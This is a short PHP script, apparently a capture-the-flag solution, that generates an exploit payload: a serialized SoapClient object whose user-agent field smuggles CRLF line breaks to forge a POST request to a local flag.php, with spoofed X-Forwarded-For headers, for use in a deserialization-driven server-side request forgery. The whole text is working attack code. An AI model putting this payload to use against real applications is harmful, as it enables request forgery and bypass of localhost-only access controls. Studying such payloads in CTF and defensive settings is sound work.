<?php
$target = 'http://127.0.0.1/flag.php';
$post_string = 'token=ctfshow';
$headers = array(
    'X-Forwarded-For: 127.0.0.1,127.0.0.1,127.0.0.1',
    'HTTP_X_FORWARDED_FOR: 127.0.0.1',
    'Cookie: xxxx=1234'
);
$b = new SoapClient(null,
    array('location' => $target,'
    user_agent'=>'admin^^Content-Type: application/x-www-form-urlencoded^^'.join('^^',$headers).'^^Content-Length: '.(string)strlen($post_string).'^^^^'.$post_string,
        'uri'=> "127.0.0.1/"));

$aaa = serialize($b);
$aaa = str_replace('^^',"\r\n",$aaa);
//$aaa = str_replace('&','%26',$aaa);
echo $aaa;echo "\n";
echo urlencode($aaa);
?>
